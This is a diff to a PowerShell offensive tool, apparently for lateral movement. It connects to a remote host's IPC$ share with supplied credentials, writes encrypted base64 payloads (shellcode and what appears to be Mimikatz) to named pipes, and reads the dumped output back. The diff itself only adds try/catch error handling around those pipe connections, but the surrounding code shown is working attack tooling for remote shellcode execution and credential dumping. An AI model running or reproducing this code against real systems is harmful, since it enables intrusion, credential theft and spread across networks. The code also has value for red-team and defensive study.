@@ -203,6 +203,7 @@ IEX $wmicmd
 }
 
 echo "`n[+] Waiting for output from named pipe.......`n"
+try {
 add-Type -assembly "System.Core";
 $pi = new-object System.IO.Pipes.NamedPipeClientStream("$pipeNameMimi"); 
 $pi.Connect($TimeoutMS); $pr = new-object System.IO.StreamReader($pi);
@@ -210,6 +211,9 @@ $wp = $pr.ReadLine();
 $pi.Dispose(); $pr.Dispose(); 
 $pl = Decrypt-String -key $pipekey -encryptedStringWithIV $wp
 $pl
+} catch {
+echo "Failed conecting to named pipe: $pipeNameMimi"
+}
 
 } else {
 if($Hash) {echo "Cannot use a hash when executing shellcode remotely as it rquired the password to create a pipe session...."; return}
@@ -322,7 +326,7 @@ $mkun = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Strin
 $mkun += $postmimi
 $Bytes = [System.Text.Encoding]::UTF8.GetBytes($mkun)
 $ed = [Convert]::ToBase64String($Bytes)
-add-Type -assembly "System.Core"
+
 if ($domain -eq ".") {
 	$net = new-object -ComObject WScript.Network
 	$net.MapNetworkDrive("", "\\$target\ipc$", $false, "$username", "$Password")
@@ -330,15 +334,30 @@ if ($domain -eq ".") {
 	$net = new-object -ComObject WScript.Network
 	$net.MapNetworkDrive("", "\\$target\ipc$", $false, "$domain\$username", "$Password")
 }
+try {
+add-Type -assembly "System.Core"
 $p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeName);
 $w = new-object System.IO.StreamWriter($p)
-$p.Connect($TimeoutMS); $w.WriteLine($ed);
-$w.Dispose(); $p.Dispose();
-add-Type -assembly "System.Core";$p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeNameMimi);
-$p.Connect($TimeoutMS);$r = new-object System.IO.StreamReader($p);
-$rr=$r.ReadLine();$p.Dispose();$r.Dispose();
+$p.Connect($TimeoutMS); 
+$w.WriteLine($ed);
+$w.Dispose(); 
+$p.Dispose();
+} catch {
+echo "Failed conecting to named pipe: $target : $pipeName"
+}
+try {
+add-Type -assembly "System.Core";
+$p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeNameMimi);
+$p.Connect($TimeoutMS);
+$r = new-object System.IO.StreamReader($p);
+$rr=$r.ReadLine();
+$p.Dispose();
+$r.Dispose();
 $pl = Decrypt-String -key $pipekey -encryptedStringWithIV $rr 
 $pl
+} catch {
+echo "Failed conecting to named pipe: $target : $pipeNameMimi"
+}
 
 }
 } else {
@@ -423,7 +442,7 @@ $mkun = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Strin
 $mkun += $sc32
 $Bytes = [System.Text.Encoding]::UTF8.GetBytes($mkun)
 $ed = [Convert]::ToBase64String($Bytes)
-add-Type -assembly "System.Core"
+
 if ($domain -eq ".") {
 	$net = new-object -ComObject WScript.Network
 	$net.MapNetworkDrive("", "\\$target\ipc$", $false, "$username", "$Password")
@@ -431,11 +450,18 @@ if ($domain -eq ".") {
 	$net = new-object -ComObject WScript.Network
 	$net.MapNetworkDrive("", "\\$target\ipc$", $false, "$domain\$username", "$Password")
 }
+
+try {
+add-Type -assembly "System.Core"
 $p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeName);
 $w = new-object System.IO.StreamWriter($p)
-$p.Connect($TimeoutMS); $w.WriteLine($ed);
-$w.Dispose(); $p.Dispose();
-
+$p.Connect($TimeoutMS); 
+$w.WriteLine($ed);
+$w.Dispose(); 
+$p.Dispose();
+} catch {
+echo "Failed conecting to named pipe: $target : $pipeName"
+}
 }
 
 }
